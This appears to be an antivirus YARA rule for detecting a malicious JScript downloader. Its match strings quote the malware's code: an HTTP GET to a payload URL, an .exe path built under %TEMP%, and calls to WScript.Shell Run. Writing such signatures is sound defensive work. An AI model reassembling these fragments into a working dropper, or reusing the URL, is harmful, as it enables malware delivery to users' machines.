rule sig_20160329_fe1767339730ad890a612c5879bbbd07 {
  meta:
    description = "datamaliciousorder - file 20160329_fe1767339730ad890a612c5879bbbd07.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a94e2dc751e243830d45f8b4755e5adbcf80ac4b202867e8fe0c87414cbe9017"

  strings:
    $s1  = "YC[Q](\"GET\", \"http://dealingdeuces.com/o4pskd\", false);" fullword ascii
    $s2  = "function jl() {return T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gMgFANIjfsBzP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[I](XO() * 11); if (YC[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function xP(Wg, aL){vj = vj * 1; return Wg - aL;};" fullword ascii
    $s5  = "var T = function b() {return WScript[DN](\"WScript.Shell\");}(), A0 = 11;" fullword ascii
    $s6  = "function X(){return \"\" + q0;};" fullword ascii
    $s7  = "function AA() {return ((gB == true) && (gB == C)) ? 1 : vj;};" fullword ascii
    $s8  = "function q(z){T[\"Run\"](z, vj, vj);};" fullword ascii
    $s9  = "var B = new this[\"Date\"]();" fullword ascii
    $s10 = " while (e){" fullword ascii
    $s11 = "return xP(A, wA);" fullword ascii
    $s12 = "function o(){return DN;};" fullword ascii
    $s13 = "function D()" fullword ascii
    $s14 = "function lB(V) {var qR = (1, 2, 3, 4, 5, V); return qR;};" fullword ascii
    $s15 = "function XO(){return 22;};" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "gB = true; " fullword ascii
    $s18 = "var Bu = false;" fullword ascii
    $s19 = "C = true; " fullword ascii
    $s20 = "var gB = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}